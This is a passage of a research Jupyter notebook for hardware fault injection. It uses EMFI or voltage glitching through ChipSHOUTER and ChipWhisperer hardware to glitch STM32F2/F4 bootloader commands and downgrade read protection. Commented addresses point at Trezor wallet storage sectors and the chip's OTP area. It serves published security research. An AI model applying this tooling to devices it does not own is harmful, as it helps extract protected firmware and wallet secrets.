## 2_stm32_bl_rdp_characterize

### STM32F2/F4 Serial Bootloader & RDP Downgrade Fault Injection Characterization

Authors: [Joe Grand](https://joegrand.com) and [Lennert Wouters](https://x.com/lennertwo)

This notebook will help characterize the proper parameters for glitching the STM32 serial bootloader commands and downgrading from RDP2 to RDP1. If using EMFI, physical position of the ChipSHOUTER probe is determined by the results of `1_stm32_cnc_characterize.ipynb`. If using VFI, the Chipwhisperer-Husky settings (`cw_init`) may need to be changed depending on your hardware setup.

Requires [ChipSHOUTER](https://www.newae.com/products/nae-cw520), [ChipWhisperer-Husky](https://www.newae.com/products/nae-cwhusky), [NewAE CW308 UFO Board](https://rtfm.newae.com/Targets/CW308%20UFO/), [Segger J-Link](https://www.segger.com/products/debug-probes/j-link/), and [STM32F2](https://www.st.com/en/microcontrollers-microprocessors/stm32f2-series.html) or [STM32F4](https://www.st.com/en/microcontrollers-microprocessors/stm32f4-series.html) with socket/adapter board.

Resources:

* [Main project page](https://grandideastudio.com/portfolio/security/stm32-fault-injection/)
* [GitHub repository](https://github.com/joegrand/stm32-fault-injection/)
* License: [GNU General Public License v3.0 or later](https://github.com/joegrand/stm32-fault-injection/blob/master/LICENSE.txt)

In [ ]:
import sys
import subprocess

import time
from datetime import datetime
from decimal import Decimal

import os
import struct

import numpy as np
from tqdm.notebook import tqdm
import matplotlib.pyplot as plt
from matplotlib.ticker import MaxNLocator
import random

import itertools  
from bokeh.plotting import figure, show
from bokeh.io import output_notebook, push_notebook, export_svgs
from bokeh.io.webdriver import webdriver_control
from bokeh.models import SingleIntervalTicker
from bokeh.layouts import column
from bokeh.palettes import Dark2_5 as palette

from chipshouter import ChipSHOUTER
import chipwhisperer as cw

import pylink         # PyLink (Segger J-Link) + Add raw JTAG support (https://github.com/square/pylink/pull/86)
import serial         # https://github.com/pyserial/pyserial
from stmbl import *

## Global constants

In [ ]:
# Device type
#DEVICE = "STM32F205"
DEVICE = "STM32F427"

# Probe type
PROBE_SIZE = "4mm"
PROBE_WINDING = "CCW"

In [ ]:
# UART
PORT_CHIPSHOUTER = "/dev/tty.usbserial-NA4ZIWB5"   # ChipSHOUTER

# ChipSHOUTER
CS_COIL_VOLTAGE    = 450    # Volts
CS_PULSE_WIDTH     = 80     # nS (set later with scope.glitch.repeat)

In [ ]:
# Result types for glitch characterization loop
@enum.unique
class RESULT(enum.IntEnum):
    NORMAL        = 0    # Expected response
    FAULT         = 1    # Successful faults
    CRASH         = 2    # Crash
    WEIRD         = 3    # Weird
    WIPE          = 4    # Unintended erase/wipe
    DOWNGRADE     = 5    # Permanent downgrade
    PCROP         = 6    # PCROP enabled (SPRMOD bit set), STM32F4 only

# Define a mapping dictionary
result_to_legend = {
    RESULT.NORMAL:     "normal",
    RESULT.FAULT:      "fault",
    RESULT.CRASH:      "crash",
    RESULT.WEIRD:      "weird",
    RESULT.WIPE:       "wipe",
    RESULT.DOWNGRADE:  "perm downgrade",
    RESULT.PCROP:      "pcrop",
}

# Function to get legend from result
def get_legend(result):
    try:
        return result_to_legend[result]
    except KeyError:
        raise ValueError("Unsupported data type.")

## Global function definitions

In [ ]:
def stm32_pwr_cycle(arm = False):
    scope.io.target_pwr = False     # Power off target via CW +3.3V
    time.sleep(0.01)
    if (arm): scope.arm()           # Arm the ADC, wait for trigger
    scope.io.target_pwr = True      # Power on target via CW +3.3V

In [ ]:
def sca_plot_traces(traces, title, mean_only = False):
    output_notebook()
    p = figure(sizing_mode='scale_width', height=500, width=1500)
    p.xaxis.formatter.use_scientific = False
    
    x_range = list(range(0, traces.shape[1]))
    colors = itertools.cycle(palette) 

    if mean_only == False:
        # Plot each trace up to range(x)
        for i, color in zip(range(5), colors):
            p.line(x_range, traces[i], color=color, legend_label=str(i))
    
    # Plot the mean
    p.line(x_range, np.mean(traces, axis=0), color='blue', legend_label='mean')
        
    p.legend.click_policy="hide"
    p.title.text = title + f" ({scope.clock.clkgen_freq / 1e6:.0f} MHz)"  # Dynamically set the title

    # Save the plot
    p.output_backend = "svg"
    export_svgs(p, filename=f'./output/{title}.svg')

    # Display the plot
    p.output_backend = "canvas"
    show(p)

    # Reset the Bokeh WebDriver to clear resources
    webdriver_control.reset()

In [ ]:
def glitch_plot_heatmap(expdata, result_type, vmax, cmap, title, vstart, vend, ostart, oend):
    labels_voltages = np.arange(vstart, vend+1, 1)
    labels_offsets = np.arange(ostart, oend+1, 1)
    
    results = np.sum(expdata[result_type,:,:,:].T, axis=1)
    #print(results.shape)
    
    # Set colormap range
    vmin = 0 
    vmax = vmax
    
    # Plot heatmap
    fig, ax = plt.subplots(figsize=(10, 6), dpi=300)
    im = ax.imshow(results, cmap=cmap, interpolation='nearest', aspect='auto', vmin=vmin, vmax=vmax)
    
    # X axis ticks
    display_voltages_idx = list(range(0,len(labels_voltages),10))
    ax.set_xticks(display_voltages_idx)
    ax.set_xticklabels(labels_voltages[display_voltages_idx], fontsize=7)
    
    # Y axis ticks
    display_offsets_idx = list(range(0,len(labels_offsets)+1,10))
    ax.set_yticks(display_offsets_idx)
    ax.set_yticklabels(labels_offsets[display_offsets_idx], fontsize=7)
    
    # Set axis labels and title
    ax.set_ylabel("Glitch offset", fontsize=9)
    ax.set_xlabel('Voltage', fontsize=9)
    titlelabel = get_legend(result_type)
    ax.set_title(f'{title}: {titlelabel.capitalize()} ({scope.clock.clkgen_freq / 1e6:.0f} MHz)', fontsize=10)
    
    # Add color bar
    cbar = ax.figure.colorbar(im)
    cbar.locator = MaxNLocator(integer=True)  # Use MaxNLocator to enforce integer ticks
    cbar.update_ticks()
    
    # Save plot
    fig.savefig(f'./output/{title} {titlelabel.capitalize()} (Heatmap).png', dpi=300, bbox_inches='tight', facecolor='white', edgecolor='white')

In [ ]:
def glitch_plot_line(expdata, parameter, y_results1, y_results2, title):
    if parameter == "Voltage":
        x_values = list(range(glitch_voltage_start, glitch_voltage_end+1))
        #x_values = list(range(bl_glitch_voltage_start, bl_glitch_voltage_end+1))
        y_values1 = np.sum(np.sum(expdata[y_results1,:,:,:], axis=1),axis=1)
        y_values2 = np.sum(np.sum(expdata[y_results2,:,:,:], axis=1),axis=1)
        
    elif parameter == "Width":
        x_values = list(range(glitch_width_start, glitch_width_end+1))
        #x_values = list(range(bl_glitch_width_start, bl_glitch_width_end+1))
        y_values1 = np.sum(np.sum(expdata[y_results1,:,:,:], axis=0),axis=1)
        y_values2 = np.sum(np.sum(expdata[y_results2,:,:,:], axis=0),axis=1)
    
    elif parameter == "Offset":
        x_values = list(range(glitch_offset_start, glitch_offset_end+1))
        #x_values = list(range(bl_glitch_offset_start, bl_glitch_offset_end+1))
        y_values1 = np.sum(np.sum(expdata[y_results1,:,:,:], axis=0),axis=0)
        y_values2 = np.sum(np.sum(expdata[y_results2,:,:,:], axis=0),axis=0)
    
    else:
        raise ValueError("Unsupported data type.")

    output_notebook()
    titlelabel1 = get_legend(y_results1)
    titlelabel2 = get_legend(y_results2)
    p = figure(title=f'{title}: {titlelabel1.capitalize()} & {titlelabel2.capitalize()} ({scope.clock.clkgen_freq / 1e6:.0f} MHz)', sizing_mode='scale_width', height=500, width=1500)  
    colors = itertools.cycle(palette) 

    p.line(x_values, y_values1, color='green', legend_label=get_legend(y_results1))
    p.line(x_values, y_values2, color='red', legend_label=get_legend(y_results2))

    p.xaxis.axis_label = parameter
    p.yaxis.axis_label = "Frequency"
    p.legend.click_policy = "hide"

    # Dynamically adjust x-axis integer ticks to prevent fractions for small ranges
    x_range = x_values[-1] - x_values[0]
    if x_range < 10:
        x_interval = max(1, x_range // 10)   # Tick interval based on x_range
        p.xaxis.ticker = SingleIntervalTicker(interval=x_interval)

    # Save the plot
    p.output_backend = "svg"
    export_svgs(p, filename=f'./output/{title} {titlelabel1.capitalize()} & {titlelabel2.capitalize()} {parameter} (Line).svg')

    # Display the plot
    p.output_backend = "canvas"
    show(p)

    # Reset the Bokeh WebDriver to clear resources
    webdriver_control.reset()

In [ ]:
def glitch_plot_bar(expdata, parameter, y_results, title):
    if parameter == "Voltage":
        x_values = np.arange(glitch_voltage_start, glitch_voltage_end + 1)
        #x_values = np.arange(bl_glitch_voltage_start, bl_glitch_voltage_end + 1)
        y_values = np.sum(np.sum(expdata[y_results,:,:,:], axis=1),axis=1)
        
    elif parameter == "Width":
        x_values = np.arange(glitch_width_start, glitch_width_end + 1)
        #x_values = np.arange(bl_glitch_width_start, bl_glitch_width_end + 1)
        y_values = np.sum(np.sum(expdata[y_results,:,:,:], axis=0),axis=1)
    
    elif parameter == "Offset":
        x_values = np.arange(glitch_offset_start, glitch_offset_end + 1)
        #x_values = np.arange(bl_glitch_offset_start, bl_glitch_offset_end + 1)
        y_values = np.sum(np.sum(expdata[y_results,:,:,:], axis=0),axis=0)
    
    else:
        raise ValueError("Unsupported data type.")

    plt.figure(figsize=(10, 6))
    plt.bar(x_values, y_values, color='#5733FF', alpha=1.0, width=1.0, label=get_legend(y_results))

    # Ensure only integer ticks are used
    plt.gca().xaxis.set_major_locator(MaxNLocator(integer=True))
    plt.gca().yaxis.set_major_locator(MaxNLocator(integer=True))

    # Add labels, title, and legend
    plt.xlabel(parameter, fontsize=12)
    plt.ylabel('Frequency', fontsize=12)
    plt.legend()
    titlelabel = get_legend(y_results)
    plt.title(f'{title}: {titlelabel.capitalize()} ({scope.clock.clkgen_freq / 1e6:.0f} MHz)', fontsize=14)  # Dynamically set the title
    plt.tight_layout()
    
    # Save the plot
    plt.savefig(f'./output/{title} {titlelabel.capitalize()} {parameter} (Bar).png', dpi=300, bbox_inches='tight', facecolor='white', edgecolor='white')

    # Display the plot
    plt.show()

## Initial setup

### ChipWhisperer-Husky

In [ ]:
try:
    scope.dis()        # Ensure the ChipWhiserer is closed
except:
    pass
    
scope = cw.scope()     # Automatically detect and connect to ChipWhisperer
scope.default_setup()  # Set default configuration values

print("\nChipWhisperer Python Version:", cw.__version__)
print("ChipWhisperer Serial Number:", scope.sn)

In [ ]:
# ChipWhisperer and glitch configuration
def cw_init():
    scope.adc.clip_errors_disabled = True
    scope.adc.lo_gain_errors_disabled = True
    scope.errors.clear() 
    
    scope.clock.clkgen_src = "system"         # CLKGEN input clock (96MHz)
    
    scope.io.tio1 = "serial_rx"
    scope.io.tio2 = "serial_tx"
    scope.io.pdic = "high_z"
    
    scope.clock.adc_mul = 1
    scope.io.hs2 = "disabled"
    
    scope.clock.clkgen_freq = 100E6       # Clock speed 100MHz
    """
    if DEVICE.startswith("STM32F2"):
        scope.clock.clkgen_freq = 100E6       # Clock speed 100MHz
    
    elif DEVICE.startswith("STM32F4"):
        scope.clock.clkgen_freq = 200E6       # Clock speed 200MHz
    """
    scope.adc.basic_mode = "rising_edge"      # ADC capture trigger
    scope.adc.timeout = 0.3                   # Number of seconds to wait for trigger event before aborting capture
    scope.io.nrst = "high_z"                  # Ensure nRST is high-Z to not conflict with STM32

    scope.glitch.enabled = True
    
    scope.glitch.clk_src = "pll"              # Glitch input clock
    scope.glitch.trigger_src = "ext_single"   # Glitch only after scope.arm() called
    scope.glitch.output = "enable_only"       # Insert glitch for entire clock cycle
    scope.io.glitch_trig_mcx = "glitch"       # Output positive-going glitch pulse on MCX connector
    
    scope.glitch.repeat = 9                   # Width of glitch pulse (in cycles)

In [ ]:
cw_init()

### Segger J-Link

In [ ]:
# https://pylink.readthedocs.io/en/latest/
jlink = pylink.JLink()

if jlink.opened() == False:
    jlink.open()

jlink.set_tif(pylink.enums.JLinkInterfaces.JTAG)   # Set Target Interface as JTAG

print(jlink.product_name)

In [ ]:
# Retrieve IDCODE via low-level JTAG SHIFTDR, does not connect to target
def pylink_idcode():
    jlink.open()
    jlink.set_tif(pylink.enums.JLinkInterfaces.JTAG)   # Set Target Interface as JTAG
    jlink.jtag_raw_rw([0], [0x1F], 5)         # JTAG Reset (TMS = 1 for 5 bits)
    jlink.jtag_raw_rw([0], [0x02], 4)         # JTAG ID read (IDCODE should be in DR upon TAP reset)
    result = jlink.jtag_raw_rw([0]*8, [0]*8)  # Shift to see what's on scan chain
    hex_id = hex(struct.unpack("<I", bytes(result[0:4]))[0])    
    return(hex_id)

In [ ]:
stm32_pwr_cycle(False)    # Power cycle target

In [ ]:
print(pylink_idcode())

### ChipSHOUTER

In [ ]:
try:
    if cs.status() == True:
        cs.disconnect()
except NameError:
    pass

cs = ChipSHOUTER(PORT_CHIPSHOUTER)

In [ ]:
def cs_init():
    cs.reset = True                  # Force hardware reset to clear any faults
    cs.absent_temp = 15              # Maximum allowable time without checking temperature sensors

    time.sleep(0.5)

    cs.hwtrig_mode = True            # Trigger polarity active-high
    cs.hwtrig_term = False           # External SMB hardware trigger as high-Z
    cs.pat_enable = False            # Disable pattern trigger

    cs.voltage = CS_COIL_VOLTAGE     # Output/coil voltage level (glitch quality is also dependent on Z height to target)
    cs.pulse.repeat = 1              # Single pulse per trigger

In [ ]:
cs_init()

In [ ]:
def arm_cs(voltage):
    cs.absent_temp = 15
    cs.faults_current = False
    cs.voltage = voltage

    if cs.state != 'armed':
        cs.armed = False
        time.sleep(1)
        cs.armed = True
        time.sleep(2)

In [ ]:
def cs_reconnect():
    while True:
        try:
            cs_init()
            break
        except OSError as e:
            if "No response from shouter" in str(e):
                print("No response from shouter, retrying...")
                time.sleep(1)
            else:
                raise  # unexpected OSError

### CNC Platform (Optional)

Adjust the Z axis so the probe is as close as possible to the target chip while still being able to move it. A piece of paper should be able to slide between the probe and target chip. The voltage required for a successful fault is directly related to the probe height above the target chip, but may affect other parameters as well.

Position the ChipSHOUTER probe over the target chip at the back left corner [0, 0]

**Ensure external remote is disconnected and RST on controller has been pressed.**

In [ ]:
# Initialize CNC controller
global cnc
CNC_TYPE = "Generic"
PORT_CNC = "/dev/tty.usbserial-14140"      # DoesBot GRBL CNC controller

try:
    cnc.close()   # Ensure the port is closed
except NameError:
    pass
except serial.SerialException:
    pass

cnc = serial.Serial(
          port = PORT_CNC,
          baudrate = 115200,
          parity = serial.PARITY_NONE,
          stopbits = serial.STOPBITS_ONE,
          bytesize = serial.EIGHTBITS,
          timeout = 1
      )
        
time.sleep(3)                            # Wait for the controller to initialize
print(cnc.read_all().decode().strip())   # Read Grbl initialization string

In [ ]:
# Send a command to the CNC and wait for an 'ok' response
def cnc_send_command(command):
    try:
        cnc.write((command + '\n').encode())   # Send the command
        cnc.flush()                            # Ensure it's transmitted
        #print(f"Sent: {command}")
       
        response = cnc.readline().decode().strip()   # Read response from the CNC
        #print(f"Received: {response}")
            
        if response == 'ok':
            return True
        elif 'error' in response:
            print(f"Error: {response}")
            return False

    except serial.SerialException as e:
        print(f"Serial Error: {e}")
        return False

In [ ]:
cnc_send_command("G21")                  # Set units to millimeters
cnc_send_command("G94")                  # Set feed rate to units per minute
cnc_send_command("G10 L2 P1 X0 Y0 Z0")   # Set current CNC position as zero/origin
cnc_send_command("G54")                  # Activate the Work Coordinate System
cnc_send_command("G90")                  # Set absolute positioning mode
    
# All subsequent G0 or G1 commands sent to the CNC are absolute coordinates relative to the defined origin
# Example: "G1 X0.1 Y0.1 F100" will move (+0.1, +0.1) in mm at a feed rate of 100mm/min

In [ ]:
cnc_send_command("G1 X8.5 Y9.0 Z0 F100")   # Set probe position (optional)

In [ ]:
cnc_send_command("G1 X-1.2 Y0.8 Z0 F100")   # CW/CCW probe adjustment (optional)

In [ ]:
cnc_send_command("G1 X2.1 Y6.4 Z0 F100")   # F2/F4 probe adjustment (optional)

In [ ]:
cnc_send_command("G1 X0 Y0 Z0 F100")       # Return to zero

## STM32 Serial Bootloader

In [ ]:
def checksum(data):
    if type(data) == int or len(data) == 1:
        if data < 0 or data > 255:
            raise ValueError('Checksum input error:', data)
        return 0xff-data
    else:
        chk = 0
        for d in data:
            chk ^= d
        return chk & 0xff

In [ ]:
def reconnect(delay=0.15):
    scope.io.nrst = False
    time.sleep(0.05)
    scope.io.pdic = True    # Set BOOT0 HIGH to enter STM32 serial bootloader
    scope.io.nrst = True
    time.sleep(delay)
    scope.io.pdic = False

    stbl.connect()

In [ ]:
def bl_connect_retry(n=5):
    for i in range(n):
        try:
            reconnect()
            return
        except:
            time.sleep(0.2*n)
            continue
    raise ValueError

In [ ]:
def reset_dut(delay = 0.05):   
    scope.io.nrst = 'high_z'
    scope.io.pdic = False          # Set BOOT0 LOW to run user code
    scope.io.target_pwr = False    # Power off target via CW +3.3V
    time.sleep(delay)
    scope.io.target_pwr = True     # Power on target via CW +3.3V
    time.sleep(0.05)

In [ ]:
scope.scopetype.usart.init(115200, stopbits=1, parity="even")
stbl = StmBl(scope.scopetype.usart, debug=False)

In [ ]:
stm32_pwr_cycle(False)    # Power cycle target

In [ ]:
reconnect()               # Connect to STM32 Serial Bootloader

In [ ]:
a, b, c = stbl.get_version()
print('Version: 0x%02x, option 1: %d, option 2: %d' %(a,b,c))
#a, b, c = stbl.get()

### Load Test Code

Requires `stm32f2_tests.bin` or `stm32f4_tests.bin` to be programmed into the target chip

In [ ]:
downgrade()

In [ ]:
# Unprotect the target if it is currently set to RDP Level 1
reconnect()
stbl.readout_unprotect()

In [ ]:
# Erase memory so we can load new code (optional)
reconnect()
stbl.extended_erase_memory(fullerase=True)

In [ ]:
reset_dut()

In [ ]:
# Set Option Bytes

# RDP = 0xAA (Level 0)
# User Option Byte = 0xEF = 0b11101111
# Bit 7: nRST_STDBY = 1 (No reset generated)
# Bit 6: nRST_STOP = 1 (No reset generated)
# Bit 5: WDG_SW = 1 (Software watchdog)
# Bit 4: BFB2 = 0 (Boot depending on BOOT pin state for STM32F427, unused for STM32F205)
# Bit 3:2: BOR_LEV = 11 (Brown out reset disabled)
# Bit 1:0: Not used = 11

option_bytes_level0 = bytearray.fromhex('EFAA1055')
reconnect()
stbl.write_memory(0x1FFFC000, option_bytes_level0)

In [ ]:
if DEVICE.startswith("STM32F2"):
    with open('./bin/stm32f2_tests.bin', 'rb') as f:
        fw = bytearray(f.read())

elif DEVICE.startswith("STM32F4"):
    with open('./bin/stm32f4_tests.bin', 'rb') as f:
        fw = bytearray(f.read())

else:
    raise ValueError("Unsupported device type.")

In [ ]:
reconnect()
if len(fw) < 256:
    stbl.write_memory(0x08000000, fw)
else:
    stbl.write_range(0x08000000, fw)

In [ ]:
reconnect()
if len(fw) < 256:
    data = stbl.read_memory(0x08000000, len(fw))
else:
    data = stbl.read_range(0x08000000, len(fw))

In [ ]:
data == fw

In [ ]:
reset_dut()

In [ ]:
r = scope.scopetype.usart.read()
print(bytes(r))
scope.scopetype.usart.write(b'D')
time.sleep(0.05)
r = scope.scopetype.usart.read()
print(bytes(r))

In [ ]:
scope.io.nrst = False
scope.io.pdic = False     # Set BOOT0 LOW to run user code
time.sleep(0.1)
r0 = scope.scopetype.usart.read()
scope.io.nrst = "high_z"
time.sleep(0.05)
r1 = scope.scopetype.usart.read()
print(r1)

In [ ]:
scope.scopetype.usart.write(b'Q')
time.sleep(0.2)
r = scope.scopetype.usart.read()
print(r)

In [ ]:
scope.scopetype.usart.init(115200, stopbits=1, parity="none")

# Boot from SRAM
scope.io.pdic = True  # Boot0
scope.io.tio3 = True  # Boot1

time.sleep(0.01)
scope.io.nrst = False
time.sleep(0.05)
scope.io.nrst = True
time.sleep(0.1)
r = scope.scopetype.usart.read()
print(r)

scope.io.tio3 = False  # Boot1
scope.scopetype.usart.init(115200, stopbits=1, parity="even")

In [ ]:
def test_fw_read(address):
    scope.scopetype.usart.flush()
    reset_dut()

    r1 = scope.scopetype.usart.read()
    scope.scopetype.usart.write(b'B')
    scope.scopetype.usart.write(address.to_bytes(4, 'big'))
    time.sleep(0.1)
    r2 = scope.scopetype.usart.read()

    return [r1, r2.hex()]

In [ ]:
test_fw_read(0x08000000)

In [ ]:
test_fw_read(0x1FFFC000)

In [ ]:
def test_pcrop_read(pwr_cycle = True):  # Return Option Bytes (0x1FFFC008, 0x1FFEC008), FLASH_OPTCR (0x40023C14) and FLASH_OPTCR1 (0x40023C18)
    scope.scopetype.usart.flush()
    if pwr_cycle == True:
        reset_dut()
    else:    # Soft reset
        scope.io.nrst = False
        scope.io.pdic = False     # Set BOOT0 LOW to run user code
        time.sleep(0.1)
        scope.io.nrst = "high_z"
        time.sleep(0.05)       

    r1 = scope.scopetype.usart.read()
    scope.scopetype.usart.write(b'P')
    time.sleep(0.01)
    r2 = scope.scopetype.usart.read()

    return [r1, len(r2), r2[0:4].hex(), r2[4:8].hex(), r2[8:12].hex(), r2[12:16].hex()]

In [ ]:
test_pcrop_read()

In [ ]:
def reprogram():
    global stbl

    cs.mute = True

    try: 
        cs.armed = False
    except Exception:
        pass

    bl_connect_retry()
    stbl.readout_unprotect()
    bl_connect_retry()

    bl_connect_retry()
    stbl.extended_erase_memory(fullerase=True)
    bl_connect_retry()

    if DEVICE.startswith("STM32F2"):
        with open('./bin/stm32f2_tests.bin', 'rb') as f:
            fw = bytearray(f.read())
    
    elif DEVICE.startswith("STM32F4"):
        with open('./bin/stm32f4_tests.bin', 'rb') as f:
            fw = bytearray(f.read())

    if len(fw) < 256:
        stbl.write_memory(0x08000000, fw)
    else:
        stbl.write_range(0x08000000, fw)

    if len(fw) < 256:
        data = stbl.read_memory(0x08000000, len(fw))
    else:
        data = stbl.read_range(0x08000000, len(fw))
    print('Programming successful:', data==fw)

    option_bytes_level1 = bytearray.fromhex('EFBB1044')
    bl_connect_retry()
    stbl.write_memory(0x1FFFC000, option_bytes_level1)

    reset_dut()
    
    try: 
        cs.armed = True
        time.sleep(2)
    except Exception:
        pass

    #cs.mute = False

In [ ]:
def reprogram_rdp2():
    global stbl

    cs.mute = True

    try: 
        cs.armed = False
    except Exception:
        pass

    bl_connect_retry()
    stbl.readout_unprotect()
    bl_connect_retry()

    bl_connect_retry()
    stbl.extended_erase_memory(fullerase=True)
    bl_connect_retry()

    if DEVICE.startswith("STM32F2"):
        with open('./bin/stm32f2_tests.bin', 'rb') as f:
            fw = bytearray(f.read())
    
    elif DEVICE.startswith("STM32F4"):
        with open('./bin/stm32f4_tests.bin', 'rb') as f:
            fw = bytearray(f.read())

    if len(fw) < 256:
        stbl.write_memory(0x08000000, fw)
    else:
        stbl.write_range(0x08000000, fw)

    if len(fw) < 256:
        data = stbl.read_memory(0x08000000, len(fw))
    else:
        data = stbl.read_range(0x08000000, len(fw))
    print('Programming successful:', data==fw)

    option_bytes_level2 = bytearray.fromhex('EFCC1033')
    bl_connect_retry()
    stbl.write_memory(0x1FFFC000, option_bytes_level2)

    reset_dut()
    
    try: 
        cs.armed = True
        time.sleep(2)
    except Exception:
        pass

    #cs.mute = False

### Enable RDP Level 1

Configure Option Bytes accordingly in order to enable Read Protection (RDP)

* 0xAA: Level 0, no protection
* 0xCC: Level 2, chip protection (debug and boot from RAM features disabled)
* Others: Level 1, read protection of memories (debug features limited)

Trezor Model One (STM32F205): Table 7 of PM0059 STM32F2xx Flash Programming Manual  
Trezor Model T (STM32F427): Table 17 of RM0090 STM32F4xx Reference Manual

In [ ]:
# RDP = 0xBB (Level 1)
# User Option Byte = 0xEF = 0b11101111
# Bit 7: nRST_STDBY = 1 (No reset generated)
# Bit 6: nRST_STOP = 1 (No reset generated)
# Bit 5: WDG_SW = 1 (Software watchdog)
# Bit 4: BFB2 = 0 (Boot depending on BOOT pin state for STM32F427, unused for STM32F205)
# Bit 3:2: BOR_LEV = 11 (Brown out reset disabled)
# Bit 1:0: Not used = 11

option_bytes_level1 = bytearray.fromhex('EFBB1044')
reconnect()
stbl.write_memory(0x1FFFC000, option_bytes_level1)

In [ ]:
# If RDP1 is successfully enabled, we should receive a NackException when accessing Flash memory
reconnect()
print(stbl.read_memory(0x08000000).hex())

### Characterization

In [ ]:
# Set desired command to characterize, can be "Write", "Go", "Read", or "Erase"
BL_COMMAND = "Read"

In [ ]:
def send_bl_command(cmd):
    if cmd == "Write":
        cmd_value = int(stbl.Command.WRITE_MEMORY)
    elif cmd == "Go":
        cmd_value = int(stbl.Command.GO)
    elif cmd == "Read":
        cmd_value = int(stbl.Command.READ_MEMORY)
    elif cmd == "Erase":
        cmd_value = int(stbl.Command.EXTENDED_ERASE)
    else:
        raise ValueError("Unsupported command.")

    scope.scopetype.usart.write(bytes([cmd_value]))
    scope.arm()
    scope.scopetype.usart.write(bytes([checksum(cmd_value)]))

In [ ]:
def sca_measurement_loop_bl():  
    cs.armed = False

    ntraces = 10
    traces = np.zeros((ntraces, scope.adc.samples), dtype='uint8')  # Integer for SAD
    #traces = np.zeros((ntraces, scope.adc.samples), dtype='float32')  # Floating point for ADC

    ret = scope.scopetype.usart.read()
    reconnect()
    ret = scope.scopetype.usart.read()

    for i in tqdm(range(ntraces), disable=True):
    #for i in tqdm(range(ntraces)):
        #reconnect()
        bl_connect_retry()
        send_bl_command(BL_COMMAND)
        
        time.sleep(0.05)
        ret = scope.scopetype.usart.read()
        print(bytes(ret))
        
        scope.capture(poll_done=True)                    # Capture trace
        traces[i] = scope.get_last_trace(as_int=True)    # Store captured trace into array (integer for SAD)
        #traces[i] = scope.get_last_trace(as_int=False)    # Store captured trace into array (floating point for ADC)

    return traces

#### Edge trigger

In [ ]:
scope.scopetype.usart.init(115200, stopbits=1, parity="even")
stbl = StmBl(scope.scopetype.usart, debug=False)
reconnect()

In [ ]:
# ChipWhisperer SCA parameters for reference capture
cw_init()

scope.gain.db = 27
scope.adc.samples = 30000
scope.adc.presamples = 1000
scope.adc.bits_per_sample = 8

scope.io.glitch_trig_mcx = 'trigger'
scope.trigger.module = 'edge_counter'
scope.trigger.triggers = 'tio2'  # serial_tx

# STM32 serial bootloader @ 8 data bits, even parity, 1 stop bit
if BL_COMMAND == "Write":
    scope.trigger.edges = 4      # WRITE_MEMORY (0x31)
elif BL_COMMAND == "Go":
    scope.trigger.edges = 6      # GO (0x21)
elif BL_COMMAND == "Read":
    scope.trigger.edges = 6      # READ_MEMORY (0x11)
elif BL_COMMAND == "Erase":
    scope.trigger.edges = 6      # EXTENDED_ERASE (0x44)
else:
    raise ValueError("Unsupported command.")

In [ ]:
traces_edge = sca_measurement_loop_bl()

In [ ]:
sca_plot_traces(traces_edge, title = f"{DEVICE} BL {BL_COMMAND} Reference Trace (Edge Trigger)", mean_only = False)

In [ ]:
# Save traces (optional)
np.save(f'./output/{DEVICE.lower()}_bl_{BL_COMMAND.lower()}_reference_sca_edge.npy', traces_edge)

In [ ]:
# Load traces (optional)
traces_edge = np.load(f'./output/{DEVICE.lower()}_bl_{BL_COMMAND.lower()}_reference_sca_edge.npy')

#### Option 1: SAD trigger

In [ ]:
downgrade()

In [ ]:
# Configure ChipWhisperer SAD (Sum of Absolute Differences)

SAD_TRACE_OFFSET = X          # End of reference trace, value needs to be determined through characterization

sad_bl_pattern = traces_edge[0][SAD_TRACE_OFFSET - scope.SAD.sad_reference_length:]

scope.io.glitch_trig_mcx = 'trigger'
scope.trigger.module = 'SAD'
scope.SAD.reference = sad_bl_pattern
scope.SAD.interval_threshold = 15
scope.SAD.threshold = 15
scope.SAD.multiple_triggers = False
scope.SAD.emode = False

scope.adc.samples = 1000         # Number of ADC samples to record in a single capture (maximum 131070)
scope.adc.presamples = 200

In [ ]:
traces_sad = sca_measurement_loop_bl()

In [ ]:
sca_plot_traces(traces_sad, title = f"{DEVICE} BL {BL_COMMAND} Reference Trace (SAD Trigger)", mean_only = False)

#### Option 2: ADC level trigger

In [ ]:
# Configure ChipWhisperer ADC (Analog-to-Digital Converter)
scope.io.glitch_trig_mcx = 'trigger'
scope.trigger.module = 'ADC'
scope.trigger.level = X    # Set this value to a discernible voltage level (based on the above plot) that will serve as our trigger

scope.adc.samples = 1000
scope.adc.presamples = 200

In [ ]:
traces_adc = sca_measurement_loop_bl()

In [ ]:
sca_plot_traces(traces_adc, title = f"{DEVICE} BL {BL_COMMAND} Reference Trace (ADC Trigger)", mean_only = False)

#### Configuration

In [ ]:
scope.io.glitch_trig_mcx = 'glitch'
scope.glitch.repeat = 9

In [ ]:
# Glitch characterization: Number of tries per parameter set
GLITCH_TRIES_BL = 10

In [ ]:
# Customized parameters
if DEVICE.startswith("STM32F2"):  # 100MHz
    bl_glitch_voltage_start = 300
    bl_glitch_voltage_end = 350
    
    bl_glitch_width_start = 11
    bl_glitch_width_end = 11
    
    bl_glitch_offset_start = 0
    bl_glitch_offset_end = 200

elif DEVICE.startswith("STM32F4"):  # 200MHz
    bl_glitch_voltage_start = 300
    bl_glitch_voltage_end = 500
    
    bl_glitch_width_start = 16
    bl_glitch_width_end = 30
    
    bl_glitch_offset_start = 0
    bl_glitch_offset_end = 400

In [ ]:
# Set address to be used during specific bootloader command
if BL_COMMAND == "Write":
    #address = 0x0807FF00   # Trezor Model One: STM32F205RET6 (512KB)
    address = 0x080FFF00   # Trezor Model One: STM32F205RGT6 (1024KB)
    #address = 0x081FFF00   # Trezor Model T: STM32F427VIT6 (2048KB)
    #address = 0x08000000   # Flash (Beware to not overwrite test code, which begins @ 0x08000000)
    #address = 0x20004000   # RAM
elif BL_COMMAND == "Go":
    #address = 0x08000000   # Flash
    #address = 0x0807FF00   # Flash (512KB)
    address = 0x080FFF00   # Flash (1024KB)
    #address = 0x20004000   # RAM
elif BL_COMMAND == "Read":
    address = 0x08000000   # Flash
    #address = 0x0807FF00   # Flash (512KB)
    #address = 0x08008000    # Trezor Model One Sector 2, Storage Area (16KB): 0x08008000 - 0x0800BFFF
    #address = 0x0800C000    # Trezor Model One Sector 3, Storage area (16KB): 0x0800C000 - 0x0800FFFF
    #address = 0x1FFF7860    # STM32 OTP (One Time Programmable) Area Block 3 (32 bytes)
    #address = 0x1FFF7A00    # STM32 Unique Device ID, (16 alignment bytes + 12 bytes)
    #address = 0x20004000   # RAM
elif BL_COMMAND == "Erase":
    address = None
else:
    raise ValueError("Unsupported command.")

if address:
